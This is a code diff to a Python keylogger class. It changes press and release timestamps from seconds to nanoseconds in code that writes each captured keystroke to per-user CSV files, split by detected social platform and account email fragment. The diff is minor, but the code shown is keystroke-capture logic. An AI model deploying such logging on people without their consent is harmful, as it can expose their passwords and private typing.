@@ -112,7 +112,7 @@ class Keylogger:
         if len(self.buffer) != 0:
             with open(self.log_file_path, "a", encoding="utf8") as _:
                 for string in self.buffer:
-                    self.buffer_write(f"R,{override_key(string)}, {time.time()}")
+                    self.buffer_write(f"R,{override_key(string)}, {time.time_ns()}")
 
     def buffer_write(self, to_add: str) -> None:
         """This function writes to the buffer and if it exceeds the size it
@@ -186,8 +186,8 @@ class Keylogger:
                 # print(platform_type)
                 # input("Check platform")
                 if platform_type is None or account_number is None:
-                    self.buffer_write(f"P,{override_key(key)}, {time.time()}")
-                    data = ["P", override_key(key), time.time()]
+                    self.buffer_write(f"P,{override_key(key)}, {time.time_ns()}")
+                    data = ["P", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         os.path.join(LOGS_DIR, self.user_id, self.user_id + ".csv"),
                         data,
@@ -203,8 +203,8 @@ class Keylogger:
                         self.user_id,
                         "f_" + self.user_id + "_" + account_email_fragment + ".csv",
                     )
-                    self.buffer_write(f"P,{override_key(key)}, {time.time()}")
-                    data = ["P", override_key(key), time.time()]
+                    self.buffer_write(f"P,{override_key(key)}, {time.time_ns()}")
+                    data = ["P", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         _social_platform_path,
                         data,
@@ -219,8 +219,8 @@ class Keylogger:
                         self.user_id,
                         "t_" + self.user_id + "_" + account_email_fragment + ".csv",
                     )
-                    self.buffer_write(f"P,{override_key(key)}, {time.time()}")
-                    data = ["P", override_key(key), time.time()]
+                    self.buffer_write(f"P,{override_key(key)}, {time.time_ns()}")
+                    data = ["P", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         _social_platform_path,
                         data,
@@ -235,8 +235,8 @@ class Keylogger:
                         self.user_id,
                         "i_" + self.user_id + "_" + account_email_fragment + ".csv",
                     )
-                    self.buffer_write(f"P,{override_key(key)}, {time.time()}")
-                    data = ["P", override_key(key), time.time()]
+                    self.buffer_write(f"P,{override_key(key)}, {time.time_ns()}")
+                    data = ["P", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         _social_platform_path,
                         data,
@@ -252,8 +252,8 @@ class Keylogger:
                 # input("Check platform")
 
                 if platform_type is None or account_number is None:
-                    self.buffer_write(f"R,{override_key(key)}, {time.time()}")
-                    data = ["R", override_key(key), time.time()]
+                    self.buffer_write(f"R,{override_key(key)}, {time.time_ns()}")
+                    data = ["R", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         os.path.join(LOGS_DIR, self.user_id, self.user_id + ".csv"),
                         data,
@@ -267,8 +267,8 @@ class Keylogger:
                         self.user_id,
                         "f_" + self.user_id + "_" + account_email_fragment + ".csv",
                     )
-                    self.buffer_write(f"R,{override_key(key)}, {time.time()}")
-                    data = ["R", override_key(key), time.time()]
+                    self.buffer_write(f"R,{override_key(key)}, {time.time_ns()}")
+                    data = ["R", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         _social_platform_path,
                         data,
@@ -283,8 +283,8 @@ class Keylogger:
                         self.user_id,
                         "t_" + self.user_id + "_" + account_email_fragment + ".csv",
                     )
-                    self.buffer_write(f"R,{override_key(key)}, {time.time()}")
-                    data = ["R", override_key(key), time.time()]
+                    self.buffer_write(f"R,{override_key(key)}, {time.time_ns()}")
+                    data = ["R", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         _social_platform_path,
                         data,
@@ -299,8 +299,8 @@ class Keylogger:
                         self.user_id,
                         "i_" + self.user_id + "_" + account_email_fragment + ".csv",
                     )
-                    self.buffer_write(f"R,{override_key(key)}, {time.time()}")
-                    data = ["R", override_key(key), time.time()]
+                    self.buffer_write(f"R,{override_key(key)}, {time.time_ns()}")
+                    data = ["R", override_key(key), time.time_ns()]
                     self.csv_writer.write_data_to_csv(
                         _social_platform_path,
                         data,
